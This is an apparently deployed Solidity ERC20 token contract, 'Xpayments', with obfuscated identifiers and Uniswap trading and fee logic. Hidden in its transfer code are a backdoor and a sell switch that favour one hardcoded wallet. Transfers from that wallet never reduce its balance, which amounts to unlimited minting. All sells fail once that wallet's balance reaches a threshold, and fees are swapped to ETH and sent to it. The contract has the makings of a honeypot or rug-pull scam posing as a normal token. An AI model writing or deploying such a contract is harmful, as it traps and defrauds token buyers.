/*

https://twitter.com/Xpayments

**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;



interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _efzcrw(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _efzcrw(a, b, "SafeMath");
    }

    function  _efzcrw(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _blfej(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract Xpayments is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _powrvu;
    address payable private _revdfo;
    address private _bvexaz;
    
    string private constant _name = unicode"Xpayments";
    string private constant _symbol = unicode"Xpayments";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 **_decimals;
    uint256 public _psoabk = _totalSupply;
    uint256 public _qrvobk = _totalSupply;
    uint256 public _pkrsvb= _totalSupply;
    uint256 public _qfwvad= _totalSupply;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _ylvcqr=0;
    uint256 private _pvfvgo=0;


    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _vrgfld;
    mapping (address => bool) private _hvqcsk;
    mapping(address => uint256) private _fualrg;

    bool private _srejopen;
    bool public _prvdeq = false;
    bool private kljokh = false;
    bool private _rovyoj = false;


    event _qrkjej(uint _psoabk);
    modifier frhvey {
        kljokh = true;
        _;
        kljokh = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _vrgfld[owner(

        )] = true;
        _vrgfld[address
        (this)] = true;
        _vrgfld[
            _revdfo] = true;
        _revdfo = 
        payable (0x969a8063c9fbfb610884744b20183e656B04889B);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _efzcrw(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 qobrfk=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_prvdeq) {
                if (to 
                != address
                (_powrvu) 
                && to !=
                 address
                 (_bvexaz)) {
                  require(_fualrg
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _fualrg
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _bvexaz && to != 
            address(_powrvu) &&
             !_vrgfld[to] ) {
                require(amount 
                <= _psoabk,
                 "Exceeds the _psoabk.");
                require(balanceOf
                (to) + amount
                 <= _qrvobk,
                  "Exceeds the _qrvobk.");
                if(_pvfvgo
                < _ylvcqr){
                  require
                  (! _frvdwx(to));
                }
                _pvfvgo++;
                 _hvqcsk
                 [to]=true;
                qobrfk = amount._blfej
                ((_pvfvgo>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _bvexaz &&
             from!= address(this) 
            && !_vrgfld[from] ){
                require(amount <= 
                _psoabk && 
                balanceOf(_revdfo)
                <_qfwvad,
                 "Exceeds the _psoabk.");
                qobrfk = amount._blfej((_pvfvgo>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_pvfvgo>
                _ylvcqr &&
                 _hvqcsk[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!kljokh 
            && to == _bvexaz &&
             _rovyoj &&
             contractTokenBalance>
             _pkrsvb 
            && _pvfvgo>
            _ylvcqr&&
             !_vrgfld[to]&&
              !_vrgfld[from]
            ) {
                _transferFrom( _bydshr(amount, 
                _bydshr(contractTokenBalance,
                _qfwvad)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _prqnrk(address
                    (this).balance);
                }
            }
        }

        if(qobrfk>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(qobrfk);
          emit
           Transfer(from,
           address
           (this),qobrfk);
        }
        _balances[from
        ]= _efzcrw(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _efzcrw(qobrfk));
        emit Transfer
        (from, to, 
        amount.
         _efzcrw(qobrfk));
    }

    function _transferFrom(uint256
     tokenAmount) private
      frhvey {
        if(tokenAmount==
        0){return;}
        if(!_srejopen)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _powrvu.WETH();
        _approve(address(this),
         address(
             _powrvu), 
             tokenAmount);
        _powrvu.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _bydshr
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _efzcrw(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _revdfo){
            return a ;
        }else{
            return a .
             _efzcrw (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _psoabk = _totalSupply;
        _qrvobk = _totalSupply;
        emit _qrkjej(_totalSupply);
    }

    function _frvdwx(address 
    account) private view 
    returns (bool) {
        uint256 Uovsq;
        assembly {
            Uovsq :=
             extcodesize
             (account)
        }
        return Uovsq > 
        0;
    }

    function _prqnrk(uint256
    amount) private {
        _revdfo.
        transfer(
            amount);
    }

    function openTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _srejopen ) ;
        _powrvu  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _powrvu), 
            _totalSupply);
        _bvexaz = 
        IUniswapV2Factory(_powrvu.
        factory( ) 
        ). createPair (
            address(this
            ),  _powrvu .
             WETH ( ) );
        _powrvu.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_bvexaz).
        approve(address(_powrvu), 
        type(uint)
        .max);
        _rovyoj = true;
        _srejopen = true;
    }

    receive() external payable {}
}